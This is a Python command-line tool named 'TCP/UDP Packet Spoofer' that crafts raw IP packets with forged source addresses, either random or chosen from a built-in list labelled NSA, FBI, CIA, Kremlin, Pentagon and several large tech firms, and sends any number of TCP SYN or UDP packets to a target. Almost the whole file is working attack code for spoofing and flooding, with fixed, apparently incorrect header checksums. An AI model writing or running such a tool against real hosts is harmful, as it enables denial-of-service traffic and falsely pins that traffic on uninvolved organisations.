#!/usr/bin/env python3
import argparse, socket, time, random, logging, datetime

class TUPacket:
    def __init__(self, src_ip, dest_ip, src_port, dest_port, protocol):
        self.src_ip = src_ip
        self.dest_ip = dest_ip
        self.src_port = src_port
        self.dest_port = dest_port
        self.protocol = protocol
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        self.addresses = {
            "8.44.101.6": "NSA",
            "153.31.119.142": "FBI",
            "198.81.129.20": "CIA",
            "195.208.24.107": "Kremlin",
            "152.152.15.131": "NATO",
            "199.209.154.0": "US-Army",
            "199.208.239.67": "Pentagon",
            "74.125.224.72": "Google",
            "216.58.194.174": "Youtube",
            "31.13.77.36": "Facebook",
            "54.239.26.128": "Amazon",
            "151.101.1.195": "Github"
        }

    def generate_random_ip(self):
        while True:
            first_octet = str(random.randint(11, 255))
            if first_octet not in ['192', '172', '10'] + [str(i) for i in range(1, 10)]:
                break
        randip = first_octet + "".join('.' + str(random.randint(0, 255)) for _ in range(3))
        return randip

    def spoof(self, delay, count):
        if self.src_ip == 'random':
            self.src_ip = self.generate_random_ip()
        elif self.src_ip == 'list':
            for ip, name in self.addresses.items():
                print(f"{ip}: {name}")
            self.src_ip = input("Enter source IP from the list above: ")
        ip_header = b'\x45\x00\x00\x28'  # Version, IHL, Type of Service | Total Length
        ip_header += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
        ip_header += b'\xff' + self.protocol.to_bytes(1, 'big') + b'\xa6\xec'  # TTL, Protocol, Header Checksum
        ip_header += socket.inet_aton(self.src_ip)  # Source Address
        ip_header += socket.inet_aton(self.dest_ip)  # Destination Address
        if self.protocol == 6:  # TCP
            header = b'\x00\x00' + self.dest_port.to_bytes(2, 'big')  # Source Port | Destination Port
            header += b'\x00\x00\x00\x00'  # Sequence Number
            header += b'\x00\x00\x00\x00'  # Acknowledgement Number
            header += b'\x50\x02\x71\x10'  # Data Offset, Reserved, Flags | Window Size
            header += b'\xe6\x32\x00\x00'  # Checksum | Urgent Pointer
        elif self.protocol == 17:  # UDP
            header = self.src_port.to_bytes(2, 'big') + self.dest_port.to_bytes(2, 'big')  # Source Port | Destination Port
            header += b'\x00\x08\x00\x00'  # Length | Checksum (0 for now)
        packet = ip_header + header
        xprotocol = 'TCP' if self.protocol == 6 else 'UDP'
        packet_word = "packet" if count == 1 else "packets"
        message = f'Sending {count} {xprotocol} {packet_word} from {self.src_ip} to {self.dest_ip}...'
        print(message)
        logging.info(message)
        xpacket = convert(ip_header) + convert(header)
        xpacket = convert2(xpacket)
        logging.info('Packet: ' + xpacket)
        for _ in range(count):
            time.sleep(delay / 1000)
            self.socket.sendto(packet, (self.dest_ip, 0))
        success_message = f'Successfully sent {count} {xprotocol} {packet_word} from {self.src_ip} to {self.dest_ip}.'
        print(success_message)
        logging.info(success_message)

def convert(hex_string):
    hex_string = ''.join('\\x{:02x}'.format(b) for b in hex_string)
    return hex_string

def convert2(hex_string):
    hex_values = hex_string.split('\\x')[1:]
    string = ''.join(chr(int(h, 16)) for h in hex_values)
    return string

def validate_ip(ip):
    if ip.lower() in ["random", "list"]:
        return True
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port):
    return 0 <= port <= 65535

def main():
    parser = argparse.ArgumentParser(description='TCP/UDP Packet Spoofer\nby dotslashCosmic')
    parser.add_argument('-p', '--protocol', choices=['tcp', 'udp'], required=True, help='Protocol (tcp/udp)')
    parser.add_argument('-source', '--source-ip', required=True, help='Source IP (or "random" for random IP, "list" for list)')
    parser.add_argument('-dest', '--dest-ip', required=True, help='Destination IP')
    parser.add_argument('-sp', '--source-port', type=int, default=0, help='Source port')
    parser.add_argument('-dp', '--dest-port', type=int, default=0, help='Destination port')
    parser.add_argument('-delay', '--delay', type=int, default=1000, help='Delay between packets in milliseconds')
    parser.add_argument('-count', '--count', type=int, default=1, help='Number of packets to send')
    parser.add_argument('-l', '--log-file', nargs='?', const=True, default=False, help='Log file name')
    args = parser.parse_args()
    if not validate_ip(args.source_ip):
        print("Invalid source IP. Please check the IP and try again.")
        return
    if not validate_ip(args.dest_ip):
        print("Invalid destination IP. Please check the IP and try again.")
        return
    if not validate_port(args.source_port):
        print("Invalid source port. Please check the port and try again.")
        return
    if not validate_port(args.dest_port):
        print("Invalid destination port. Please check the port and try again.")
        return
    if args.log_file is True:
        now = datetime.datetime.now()
        log_file = f"{now.strftime('%Y%m%d%H%M%S')}_{args.dest_ip.replace('.', '_')}.txt"
    elif args.log_file:
        log_file = args.log_file
    else:
        log_file = None
    if log_file:
        logging.basicConfig(filename=log_file, level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.DEBUG)
    protocol = 6 if args.protocol.lower() == 'tcp' else 17
    tup = TUPacket(args.source_ip, args.dest_ip, args.source_port, args.dest_port, protocol)
    try:
        tup.spoof(args.delay, args.count)
    except Exception as e:
        error_message = f"Error occurred: {str(e)}"
        print("An error occurred while sending packets. Please check the logs for more details.")
        logging.error(error_message)

if __name__ == "__main__":
    main()
